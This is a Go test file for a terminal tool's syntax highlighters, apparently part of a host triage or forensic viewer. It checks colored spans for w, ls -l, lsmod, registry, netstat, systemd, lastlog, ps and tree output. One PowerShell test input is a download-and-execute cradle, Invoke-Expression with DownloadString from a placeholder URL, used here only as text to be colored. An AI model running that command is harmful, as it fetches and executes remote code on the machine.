// The lexers and the span machinery they build spans with, tested where they
// live: what one line of a tool's output turns into, and which stretch of it
// takes which color.

package syntax

import (
	"fmt"
	"os"
	"regexp"
	"strings"
	"testing"

	"github.com/charmbracelet/lipgloss"
	"github.com/muesli/termenv"

	"karma/internal/form"
	"karma/internal/model"
	"karma/internal/shape"
)

var ansi = regexp.MustCompile(`\x1b\[[0-9;]*m`)

func plain(s string) string { return ansi.ReplaceAllString(s, "") }

func TestMain(m *testing.M) {
	// The test process's stdout is not a terminal, so lipgloss lands in the
	// Ascii profile and comparing plain text would verify no coloring at all;
	// pinning the 256-color profile makes this package's color assertions real.
	lipgloss.SetColorProfile(termenv.ANSI256)
	os.Exit(m.Run())
}

func TestTableStylerStaysInsideTheLine(t *testing.T) {
	table := newTableStyler(nil)
	lines := []string{
		"USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT",
		"root     pts/0    1.2.3.4          21:17    0.00s  0.01s  0.00s w",
	}
	if spans := table.style(lines[0]); spans != nil {
		t.Fatalf("an all-caps header only records column anchors: %v", spans)
	}
	spans := table.style(lines[1])
	if len(spans) == 0 {
		t.Fatal("a data row should get column colors")
	}
	for _, span := range spans {
		if span.Start < 0 || span.End > len(lines[1]) || span.Start >= span.End {
			t.Fatalf("span out of range: %+v line length %d", span, len(lines[1]))
		}
	}

	banner := "21:31:02 up 95 days, 12:16,  3 users,  load average: 1.33, 0.61, 0.28"
	bannerSpans := table.style(banner)
	if len(bannerSpans) != 1 || bannerSpans[0].Start != 0 || bannerSpans[0].End != len(banner) ||
		bannerSpans[0].Style != mutedStyle {
		t.Fatalf("w's uptime banner should be muted whole-line: %+v", bannerSpans)
	}
	short := " 10:20:30 up 12:16,  1 user,  load average: 0.00, 0.01, 0.05"
	if got := table.style(short); len(got) != 1 || got[0].Style != mutedStyle {
		t.Fatalf("an uptime banner under a day should also be muted whole-line: %+v", got)
	}
}

func TestLsLPermissionBitsPaintedOverMutedBase(t *testing.T) {
	line := "-rw-r--r-- 1 root root 4096 Jan 01 12:34 /tmp/notes.txt"
	painted := form.PaintLine(line, styleLsL(line))
	wBit := style{FG: "3"}.Style().Render("w")
	if !strings.Contains(painted, wBit) {
		t.Fatalf("permission bits should be lit one by one (w yellow): %q", painted)
	}
	clock := style{FG: "2"}.Style().Render("Jan 01 12:34")
	if !strings.Contains(painted, clock) {
		t.Fatalf("a date with a time should be green: %q", painted)
	}
	owners := mutedStyle.Style().Render("-- 1 root root ")
	if !strings.Contains(painted, owners) {
		t.Fatalf("owner and group should be muted: %q", painted)
	}
}

func TestLsmodKeepsUsedByTailPlain(t *testing.T) {
	styler := Painter("lsmod")
	if spans := styler("Module                  Size  Used by"); spans != nil {
		t.Fatalf("the header row should not be painted: %v", spans)
	}
	row := "nvidia_uvm            1310720  2 nvidia_core nvidia"
	tail := strings.Index(row, "nvidia_core")
	spans := styler(row)
	if len(spans) == 0 {
		t.Fatal("a data row should get column colors")
	}
	for _, span := range spans {
		if span.End > tail {
			t.Fatalf("the Used by tail (which may contain spaces) should stay default: %+v row %q", span, row)
		}
	}
	for i, want := range []string{"nvidia_uvm", "1310720", "2"} {
		if !strings.Contains(form.PaintLine(row, spans), tableColumnStyles[i].Style().Render(want)) {
			t.Fatalf("column %d should have its column color: %+v", i, spans)
		}
	}
	legacy := "nvidia 53248 2 nvidia - Live 0xffffffffa0000000"
	if tail := strings.Index(legacy, "Live"); tail > 0 {
		for _, span := range styler(legacy) {
			if span.End > tail {
				t.Fatalf("the state field of /proc/modules should stay default: %+v", span)
			}
		}
	}
}

func TestLineStylerPanicFallsBackToPlain(t *testing.T) {
	boomer := safeLineStyler(func(string) []paintSpan { panic("odd output") })
	if spans := boomer("any line"); spans != nil {
		t.Fatalf("a panic should return no spans: %v", spans)
	}
	if spans := boomer("next line"); spans != nil {
		t.Fatalf("one blow-up should degrade to plain text permanently: %v", spans)
	}
}

func TestRegStyler(t *testing.T) {
	styler := Painter("reg")
	key := `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths`
	if spans := styler(key); len(spans) != 1 || spans[0].Start != 0 || spans[0].End != len(key) {
		t.Fatalf("the key path should be painted whole-line: %+v", spans)
	}
	row := `    url1    REG_SZ    \\Mac\Home\Docs`
	spans := styler(row)
	for _, want := range []struct {
		text   string
		Styler style
	}{
		{"url1", style{FG: "4"}},
		{"REG_SZ", keywordColor},
	} {
		if !strings.Contains(form.PaintLine(row, spans), want.Styler.Style().Render(want.text)) {
			t.Fatalf("the value row should light up %q: %q", want.text, plain(form.PaintLine(row, spans)))
		}
	}
	hexRow := `    0    REG_BINARY    0C,00,00,00`
	if spans := styler(hexRow); !strings.Contains(form.PaintLine(hexRow, spans), dimStyle.Style().Render("0C,00,00,00")) {
		t.Fatalf("hex data should be dimmed: %q", plain(form.PaintLine(hexRow, styler(hexRow))))
	}
	cont := `        00,00,00,00`
	if spans := styler(cont); len(spans) != 1 || spans[0].Style != dimStyle {
		t.Fatalf("a wrapped continuation should be dimmed whole-line: %+v", spans)
	}
}

func TestUSBStyler(t *testing.T) {
	styler := Painter("pipe")
	row := `win2k25-0 SSD | 3&4b87e29&0&000000 | Installed 2025-01-02 03:04:05 | Last Connected 2025-06-07 08:09:10`
	spans := styler(row)
	if len(spans) == 0 {
		t.Fatal("a usb row should be painted")
	}
	painted := form.PaintLine(row, spans)
	if !strings.Contains(painted, style{FG: "4"}.Style().Render("win2k25-0 SSD")) {
		t.Fatalf("the device name should be blue: %q", plain(painted))
	}
	if !strings.Contains(painted, style{FG: "2"}.Style().Render("2025-01-02 03:04:05")) {
		t.Fatalf("a timestamp should be green: %q", plain(painted))
	}
	if !strings.Contains(painted, mutedStyle.Style().Render("Last Connected")) {
		t.Fatalf("a label should be muted: %q", plain(painted))
	}
	bare := `MacBook Pro Camera | 6&3b8d32a8&0&0000`
	if spans := styler(bare); len(spans) == 0 {
		t.Fatal("a row without a timestamp should also be painted")
	}
}

func TestNetstatStyler(t *testing.T) {
	styler := Painter("netstat")
	header := `  Proto  Local Address          Foreign Address        State           PID`
	if spans := styler(header); spans != nil {
		t.Fatalf("a header row only records column anchors: %v", spans)
	}
	row := `  TCP    10.0.0.5:52134         1.2.3.4:443           ESTABLISHED     4321`
	spans := styler(row)
	if len(spans) == 0 {
		t.Fatal("a data row should get column colors")
	}
	for _, span := range spans {
		if span.Start < 0 || span.End > len(row) || span.Start >= span.End {
			t.Fatalf("span out of range: %+v line length %d", span, len(row))
		}
	}
}

func TestPowershellStyler(t *testing.T) {
	styler := Painter("powershell")
	line := `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x/y.ps1')`
	spans := styler(line)
	if len(spans) == 0 {
		t.Fatal("a PowerShell command line should be painted")
	}
	painted := form.PaintLine(line, spans)
	if !strings.Contains(painted, keywordColor.Style().Render("Invoke-Expression")) {
		t.Fatalf("a cmdlet should get the keyword color: %q", plain(painted))
	}
	if !strings.Contains(painted, stringColor.Style().Render(`'http://x/y.ps1'`)) {
		t.Fatalf("a URL string should be blue: %q", plain(painted))
	}
	for _, span := range spans {
		if span.Start < 0 || span.End > len(line) || span.Start >= span.End {
			t.Fatalf("span out of range: %+v line length %d", span, len(line))
		}
	}
}

// The unit table's ACTIVE and SUB cells are repainted by meaning once the
// header anchors the columns: alive (active/running) green, finished
// (exited/inactive) faint. A state word inside DESCRIPTION keeps the plain
// table color.

func TestUnitStateCellsPaintedByMeaning(t *testing.T) {
	pad := func(text string, width int) string { return text + strings.Repeat(" ", width-len(text)) }
	header := pad("UNIT", 16) + pad("LOAD", 7) + pad("ACTIVE", 9) + pad("SUB", 11) + "DESCRIPTION"
	styler := Painter("units")
	if spans := styler(header); spans != nil {
		t.Fatalf("the header should only record anchors: %v", spans)
	}
	hasSpan := func(spans []paintSpan, line, word string, want style) bool {
		start := strings.Index(line, word)
		for _, span := range spans {
			if span.Start == start && span.End == start+len(word) && span.Style == want {
				return true
			}
		}
		return false
	}
	covered := func(spans []paintSpan, start, end int) bool {
		for _, span := range spans {
			if span.Start <= start && span.End >= end {
				return true
			}
		}
		return false
	}

	running := pad("nginx.service", 16) + pad("loaded", 7) + pad("active", 9) + pad("running", 11) +
		"A high performance web server"
	spans := styler(running)
	if !hasSpan(spans, running, "active", style{FG: "2"}) ||
		!hasSpan(spans, running, "running", style{FG: "2"}) {
		t.Fatalf("active/running should be painted green: %+v", spans)
	}
	exited := pad("certbot.service", 16) + pad("loaded", 7) + pad("active", 9) + pad("exited", 11) +
		"Certbot renewal"
	spans = styler(exited)
	if !hasSpan(spans, exited, "active", style{FG: "2"}) || !hasSpan(spans, exited, "exited", dimStyle) {
		t.Fatalf("active should stay green and exited should go Faint: %+v", spans)
	}
	desc := pad("sshd.service", 16) + pad("loaded", 7) + pad("active", 9) + pad("running", 11) +
		"daemon that keeps users running"
	spans = styler(desc)
	at := strings.LastIndex(desc, "running")
	if covered(spans, at, at+len("running")) {
		t.Fatalf("a state word inside DESCRIPTION should stay default: %+v", spans)
	}
	// dead is the state systemd leaves a unit it gave up on in: it has to read
	// apart from both the alive states and the finished ones.
	dead := pad("grub.service", 16) + pad("loaded", 7) + pad("inactive", 9) + pad("dead", 11) +
		"GRUB failed boot detection"
	spans = styler(dead)
	if !hasSpan(spans, dead, "dead", unitStateStyles["dead"]) {
		t.Fatalf("dead should be painted by its own state: %+v", spans)
	}
	if unitStateStyles["dead"] == dimStyle || unitStateStyles["dead"] == unitStateStyles["running"] {
		t.Fatalf("dead wears %+v, one of the colors it has to read apart from", unitStateStyles["dead"])
	}
	// failed keeps the cycling column color: the rules decide what a row means,
	// and the word itself is what a rule reads.
	failed := pad("grub.service", 16) + pad("loaded", 7) + pad("failed", 9) + pad("failed", 11) +
		"GRUB failed boot detection"
	spans = styler(failed)
	if !hasSpan(spans, failed, "failed", tableColumnStyles[2]) {
		t.Fatalf("failed should keep its column color: %+v", spans)
	}
}

// The list-unit-files rows the persistence check collects carry two state words
// — the unit's own and the vendor preset — each painted by its value, so a unit
// that boots reads apart from one that was talked out of it.

func TestUnitFileStateWordsPaintedByValue(t *testing.T) {
	pad := func(text string, width int) string { return text + strings.Repeat(" ", width-len(text)) }
	styler := Painter("unit-files")
	hasSpan := func(spans []paintSpan, line, word string, want style) bool {
		start := strings.Index(line, word)
		for _, span := range spans {
			if span.Start == start && span.End == start+len(word) && span.Style == want {
				return true
			}
		}
		return false
	}
	enabled := pad("ssh.service", 32) + pad("enabled", 16) + "enabled"
	if !hasSpan(styler(enabled), enabled, "enabled", style{FG: "2"}) {
		t.Fatalf("enabled should be painted green: %+v", styler(enabled))
	}
	disabled := pad("ufw.service", 32) + pad("disabled", 16) + "enabled"
	if !hasSpan(styler(disabled), disabled, "disabled", dimStyle) {
		t.Fatalf("disabled should be Faint: %+v", styler(disabled))
	}
	if unitFileStateStyles["enabled"] == unitFileStateStyles["disabled"] {
		t.Fatal("enabled and disabled wear one color")
	}
	// A row with no state word — the header, the closing count — takes the name
	// column alone rather than the word-by-word cycle a generic table gets.
	header := "UNIT FILE            STATE           PRESET"
	spans := styler(header)
	if len(spans) != 1 || spans[0].Style != tableColumnStyles[0] {
		t.Fatalf("the header should take the name column alone: %+v", spans)
	}
}

// list-timers' NEXT/LAST dates span several words ("Thu 2026-07-30 00:00:00
// UTC"); the lexer reads the row as the six cells it is and paints each whole,
// where the generic table styler colored one date in four colors.

func TestTimersPaintWholeDateCells(t *testing.T) {
	line := "Thu 2026-07-30 00:00:00 UTC  2h 30min left  Wed 2026-07-29 21:30:00 UTC  1h 30min ago  " +
		"logrotate.timer  logrotate.service"
	want := "Thu 2026-07-30 00:00:00 UTC=244 Wed 2026-07-29 21:30:00 UTC=244 2h 30min left=2 " +
		"1h 30min ago= logrotate.timer=4 logrotate.service=6"
	if got := spansOf(line, timersRow(line)); got != want {
		t.Fatalf("spans = %q, want %q", got, want)
	}
	// A timer that never ran carries n/a in both date cells, which are single
	// words rather than four.
	never := "n/a                          n/a                             n/a                       " +
		"n/a                        apt-daily.timer  apt-daily.service"
	want = "n/a=244 n/a=244 n/a=2 n/a= apt-daily.timer=4 apt-daily.service=6"
	if got := spansOf(never, timersRow(never)); got != want {
		t.Fatalf("spans = %q, want %q", got, want)
	}
	// The header and the closing count are not rows of the table.
	for _, plain := range []string{"NEXT  LEFT  LAST  PASSED  UNIT  ACTIVATES", "4 timers listed."} {
		if spans := timersRow(plain); spans != nil {
			t.Errorf("%q should carry no color: %+v", plain, spans)
		}
	}
}

// The accounting store's closing line is a remark about the file — where its
// records begin, or that it holds none — not a row of it: the word-by-word
// cycle would paint its parts, so the table styler leaves it plain.
func TestTableStylerLeavesTheStoreTrailerPlain(t *testing.T) {
	styler := Painter("table")
	for _, line := range []string{
		"/var/log/btmp has no entries",
		"btmp begins Mon Oct  5 09:12:00 2026",
		"wtmp begins Mon Oct  5 22:04:11 2026",
		"wtmpdb begins Mon Oct  5 22:04:11 2026",
	} {
		if spans := styler(line); spans != nil {
			t.Fatalf("%q should stay plain: %+v", line, spans)
		}
	}
	row := "root     ssh          117.67.231.246   Mon Oct  5 22:04 - still logged in"
	if spans := styler(row); len(spans) == 0 {
		t.Fatal("a session row should still get column colors")
	}
}

// lastlog's header is mixed case, so the all-caps header test does not
// recognize it: the check declares its own syntax, which anchors the columns on
// the header and leaves the note line printed ahead of it plain — the
// word-by-word cycle is for headerless tables only. The two rows are the tool's
// own output, "Latest" included, one column right of the timestamps below it.

func TestLastlogStylerAnchorsOnItsHeader(t *testing.T) {
	styler := Painter("lastlog")
	note := "note: /var/lib/lastlog/lastlog2.db present, /var/log/lastlog is frozen"
	if spans := styler(note); spans != nil {
		t.Fatalf("a note ahead of the header should stay plain: %v", spans)
	}
	header := "Username         Port     From                                       Latest"
	if spans := styler(header); spans != nil {
		t.Fatalf("the header should only record anchors: %v", spans)
	}
	row := "root             pts/0    117.67.231.246                            Mon Oct  5 20:01:48 +0800 2026"
	spans := styler(row)
	painted := form.PaintLine(row, spans)
	for i, want := range []string{"root", "pts/0", "117.67.231.246"} {
		if !strings.Contains(painted, tableColumnStyles[i].Style().Render(want)) {
			t.Fatalf("column %d should have its column color (%q): %q", i, want, plain(painted))
		}
	}
	latest := strings.Index(row, "Mon")
	for _, span := range spans {
		if span.Start >= latest {
			t.Fatalf("the timestamp column should stay plain: %+v", spans)
		}
	}
}

// A numeric column is right-aligned, so its value drifts left as the number
// grows wider. The pid column of ps aux changed color when a process count
// crossed ten: a one-digit pid starts two characters right of the header's
// anchor, and the tolerance-based lookup read it as the column after it. The
// row's field order settles the column, so every pid keeps the column it belongs
// to whatever its width.

func TestTableStylerKeepsThePIDColumnAtEveryWidth(t *testing.T) {
	cases := []struct {
		syntax model.Syntax
		column int
		header string
		row    func(pid string) string
	}{
		{model.SyntaxTable, 1,
			"USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND",
			func(pid string) string {
				return fmt.Sprintf("%s%12s  0.0  0.0  102528  7880 ?        S    13:41   0:01.18 systemd", "root", pid)
			}},
	}
	for _, tc := range cases {
		styler := Painter(tc.syntax)
		if spans := styler(tc.header); spans != nil {
			t.Fatalf("%s: the header should only record anchors: %v", tc.syntax, spans)
		}
		for _, pid := range []string{"1", "9", "10", "99", "123", "1234", "12345", "123456", "1234567"} {
			row := tc.row(pid)
			painted := form.PaintLine(row, styler(row))
			if !strings.Contains(painted, tableColumnStyles[tc.column].Style().Render(pid)) {
				t.Errorf("%s: the pid %q should carry column %d's color: %q",
					tc.syntax, pid, tc.column, plain(painted))
			}
			next := tableColumnStyles[(tc.column+1)%len(tableColumnStyles)].Style().Render(pid)
			if strings.Contains(painted, next) {
				t.Errorf("%s: the pid %q took the next column's color: %q", tc.syntax, pid, plain(painted))
			}
		}
	}
}

// fstab is drawn by the check's form: the six fields become the table's columns,
// and a comment — one value, no row to fill — keeps its own bytes as the remark
// it is rather than landing in the Device column under the head.

// The tree lexer colors a drawn lead by nesting: each bar the hue of the level
// it descends from, the branch glyph the node's own, and tree's own closing
// count muted; everything else — a root's label, a line no tree drew — stays
// plain. Both drawers feed it, so the records tree and the shaped tree color
// alike.
func TestTreeStylerColorsTheLeadByLevel(t *testing.T) {
	rec := func(pid, ppid, command string) model.BlockItem {
		return model.BlockItem{Rec: &model.Record{Fields: []model.Field{
			{Name: "PID", Value: pid}, {Name: "PPID", Value: ppid}, {Name: "COMMAND", Value: command},
		}}}
	}
	nest := form.Tree{ID: "PID", Parent: "PPID", Label: []string{"PID", "COMMAND"}}.Render(model.Block{
		Header: []string{"PID", "PPID", "COMMAND"},
		Items: []model.BlockItem{
			rec("1", "0", "/sbin/init"),
			rec("948", "1", "sshd"),
			rec("2210", "948", "bash"),
		},
	}, model.RenderOptions{Width: 80})
	if spans := styleTree(nest[0]); spans != nil {
		t.Errorf("a root's own line has no branch to color: %v", spans)
	}
	first := paintSpan{Start: 0, End: len("└── "), Style: form.LevelPaint(1)}
	if spans := styleTree(nest[1]); len(spans) != 1 || spans[0] != first {
		t.Errorf("a first-level glyph takes the cycle's first tint: %v", spans)
	}
	// A gap segment paints nothing, so the second-level glyph starts four bytes late.
	under := paintSpan{Start: len("    "), End: len("    ") + len("└── "), Style: form.LevelPaint(2)}
	if spans := styleTree(nest[2]); len(spans) != 1 || spans[0] != under {
		t.Errorf("the glyph under a closed branch takes its own level's hue: %v", spans)
	}

	drawn := shape.HomeTree("", "drwxr-x--- 5 lab lab 4096 Jul 29 17:40 /home\n"+
		"drwxr-x--- 5 lab lab 4096 Jul 29 17:40 /home/lab\n"+
		"-rw------- 1 lab lab 1929 Jul 29 17:49 /home/lab/.bash_history\n"+
		"drwx------ 2 lab lab 4096 Jul 29 13:41 /home/lab/.ssh\n"+
		"-rw------- 1 lab lab 99 Jul 29 13:41 /home/lab/.ssh/authorized_keys\n"+
		"drwxr-xr-x 2 lab lab 4096 Jan 06 16:23 /home/other user\n")
	if drawn == nil {
		t.Fatal("the listing rows should be drawn as a tree")
	}
	// /home/lab is a mid child of /home, so its own row carries a bar and a
	// glyph of adjacent levels; the file under the closed .ssh branch carries a
	// bar, a gap, then its glyph.
	sibling := "│   ├── [-rw------- lab lab 1929 Jul 29 17:49]  /home/lab/.bash_history"
	adjacent := []paintSpan{
		{Start: 0, End: len("│   "), Style: form.LevelPaint(1)},
		{Start: len("│   "), End: len("│   ") + len("├── "), Style: form.LevelPaint(2)},
	}
	if spans := styleTree(sibling); len(spans) != 2 || spans[0] != adjacent[0] || spans[1] != adjacent[1] {
		t.Errorf("a bar keeps its level's hue and the glyph takes the node's: %v", spans)
	}
	deep := "│       └── [-rw------- lab lab 99 Jul 29 13:41]  /home/lab/.ssh/authorized_keys"
	third := []paintSpan{
		{Start: 0, End: len("│   "), Style: form.LevelPaint(1)},
		{Start: len("│   ") + len("    "), End: len("│   ") + len("    ") + len("└── "), Style: form.LevelPaint(3)},
	}
	if spans := styleTree(deep); len(spans) != 2 || spans[0] != third[0] || spans[1] != third[1] {
		t.Errorf("a gap paints nothing and the third level's glyph takes its hue: %v", spans)
	}
	count := "3 directories, 2 files"
	for _, line := range []string{sibling, deep, count} {
		if !strings.Contains(drawn.Text, line) {
			t.Fatalf("the shaped tree should contain %q:\n%s", line, drawn.Text)
		}
	}
	if spans := styleTree(count); len(spans) != 1 || spans[0].Style != mutedStyle {
		t.Errorf("tree's own closing count should be muted: %v", spans)
	}
	if spans := styleTree("|-- ascii branches a non-UTF-8 locale prints"); spans != nil {
		t.Errorf("a line no tree of ours drew stays plain: %v", spans)
	}
}

// The reading layer lines a listing's columns up before the panel paints it, so
// the lexer reads rows with runs of spaces between the columns too; the name
// span still covers the whole path.
func TestLsLAlignedRow(t *testing.T) {
	row := "drwxr-xr-x  2 root root    4096 Oct 06 12:00 /tmp/sub"
	painted := form.PaintLine(row, styleLsL(row))
	if painted == row {
		t.Fatalf("an aligned ls-l row should be colored: %q", painted)
	}
	if plain(painted) != row {
		t.Fatalf("the paint should not change the text: %q", painted)
	}
	nameAt := strings.Index(row, "/tmp/sub")
	covered := false
	for _, span := range styleLsL(row) {
		if span.Start == nameAt {
			covered = span.End == len(row)
		}
	}
	if !covered {
		t.Fatalf("the name span should cover the whole path: %+v", styleLsL(row))
	}
}

// The test process's stdout is not a terminal, so lipgloss lands in the Ascii
// profile and comparing plain text would verify no coloring at all; pinning the
// 256-color profile makes this package's color assertions real.
